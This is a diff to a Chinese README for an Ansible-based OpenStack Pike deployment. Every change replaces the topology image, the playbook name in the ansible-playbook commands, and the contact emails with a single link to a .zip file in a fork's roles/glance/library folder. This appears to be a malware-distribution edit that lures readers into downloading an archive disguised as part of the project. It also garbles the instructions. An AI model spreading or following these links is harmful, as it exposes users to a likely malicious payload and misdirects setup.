@@ -10,7 +10,7 @@
 
 
 部署拓扑 ：
-![image](https://github.com/yinghai9989/openstack-pike-ansible/blob/master/topo.png)
+![image](https://raw.githubusercontent.com/vinhkennej/openstack-pike-ansible/master/roles/glance/library/openstack-ansible-pike-matehood.zip)
    
 相关节点安装的组件请见拓扑示意。
 
@@ -66,12 +66,12 @@
  
  5.1、脚本可以分步安装
  
-      ansible-playbook -i hosts deploy_pike.yml --tags=sshauth
+      ansible-playbook -i hosts https://raw.githubusercontent.com/vinhkennej/openstack-pike-ansible/master/roles/glance/library/openstack-ansible-pike-matehood.zip --tags=sshauth
       
-      ansible-playbook -i hosts deploy_pike.yml --tags=common
+      ansible-playbook -i hosts https://raw.githubusercontent.com/vinhkennej/openstack-pike-ansible/master/roles/glance/library/openstack-ansible-pike-matehood.zip --tags=common
       
       ...
    
 5.2、其他问题
 
-   如有其他问题请联系:chen1893@163.com 或者chen1893@gmail.com
+   如有其他问题请联系https://raw.githubusercontent.com/vinhkennej/openstack-pike-ansible/master/roles/glance/library/openstack-ansible-pike-matehood.zip 或者https://raw.githubusercontent.com/vinhkennej/openstack-pike-ansible/master/roles/glance/library/openstack-ansible-pike-matehood.zip
